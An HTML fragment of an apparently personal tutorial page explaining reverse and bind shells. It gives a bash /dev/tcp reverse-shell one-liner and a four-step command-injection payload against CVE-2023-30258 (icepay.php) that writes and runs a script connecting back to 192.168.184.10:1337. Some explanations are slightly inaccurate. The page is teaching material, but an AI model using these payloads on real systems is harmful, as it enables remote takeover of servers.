    <h2>Attack types</h2>
    <p>Reverse shells are an attack technique in which the attacker forces the target to execute malicious code that initiates a connection back to the attacker’s machine. 
        On the attacker’s side, a program such as netcat, socat, or another socket-based application listens for and accepts this incoming connection, allowing remote command execution.
    </p>

    <p>
    Bind shells work differently. In this attack technique, the attacker causes the target system to open a network port and run a service that listens for incoming connections. 
    Once an attacker successfully connects to this port, they can send commands directly to the target system.
    <br>
    <br>
    <strong>Interactive vs Non-Interactives</strong>
    <br>
    <u>Interactive shells</u> allows you to execute "sophisticated" programs which
    demands and allow you to interact with programs after executing them.
    A good example is the text editor nano opened in a local shell.
    <br>
    <br>
    <u>Non-Interactive shells</u> (this is what you will receive when you reverse
    a connection) are limited shells, it means that they will not be able
    to run complex programs without crashing the whole thing. It happens
    because when you reverse a connection, in truth, you are interacting 
    with a process running inside of a terminal.

    <h2>Reversing techniques</h2>
    <p>I will list and explain here some reversing techniques and which I think that are really useful. <br>
    <br>
    <strong>Bash (raw)</strong><br>
    <code>sh -i >& /dev/tcp/{YOUR_IP}/{YOUR_PORT} 0>&1</code><br>
    This is way to reverse a connection. This case is more efficient in vulnerabilities which allows you to write
    and execute code (RCE). To examplify the how useful it is, we can use the vulnerabily CVE-2023-30258, there is parameter in the URL which
    allows you to execute commands. With it, we can do something like: <br>
    <br>
    <code>
    icepay.php?democ=testfile; echo "#!/bin/bash" > /tmp/a.sh <br>
    icepay.php?democ=testfile; echo "sh -i /dev/tcp/192.168.184.10/1337 0>&1" >> /tmp/a.sh <br>
    icepay.php?democ=testfile; chmod 755 /tmp/a.sh <br>
    icepay.php?democ=testfile; sh /tmp/a.sh
    </code> <br> 

    Let's break this code: <br>
    <br>
    <strong>sh -i</strong> invoke the shell in interactive mode, which allows type commands and to see the output. <br>
    <br>
    <strong>/dev/tcp/{your_ip}/{your_port}</strong> It is a special feature on shell, when you type it, the shell tries to open a file (because / is a redirector operator)
    however the kernel takes this as a request to open a socket with the IP and PORT specified. There is a more detailed explanation 
    right <a href="https://stackoverflow.com/questions/76899269/can-someone-explain-how-does-this-command-works-bash-i-dev-tcp-ip-port">here.</a> <br>
    <br>
    <strong>>&</strong> This part does two redirections: > redirects the stdout (standard output) and the & redirects stdout and stderr. This is necessary to see the outputs
    through the TCP connection.
    <br>
    <strong>0>&1</strong> This one redirects the stdin 0 (keyboard input) to the stdout (screen output). It means: dommands typed remotely are executed locally (in this case, locally
    for us means the target POV).

    I intend to keep updating this page with more study content stuff.
    I really like to teach people who really want to learn, so for me it is a pleasure to help.
